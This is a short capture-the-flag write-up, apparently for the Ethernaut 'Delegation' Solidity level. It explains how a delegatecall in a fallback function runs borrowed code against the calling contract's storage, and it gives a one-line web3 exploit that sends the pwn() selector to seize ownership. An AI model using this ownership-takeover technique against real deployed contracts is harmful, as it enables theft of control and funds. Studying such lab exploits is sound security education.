# Delegation

The goal of this level is for you to claim ownership of the instance you are given.<br/>
Things that might help<br/>

- Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.<br/>
- Fallback methods<br/>
- Method ids<br/>

We interact with Delegation contract not delegate contract and in delegation contract has `address(delegate).delegatecall(msg.data);` that allow you to borrow function from delegate contract but state effect on Delegetion contract.<br/>

Trigger fallback function and send msg.data as pwn() function to clain ownership:

```javascript
await contract.sendTransaction({ data: web3.eth.abi.encodeFunctionSignature('pwn()') });
```

Verify that the owner change to be our player address:
```javascript
await contract.owner();
```
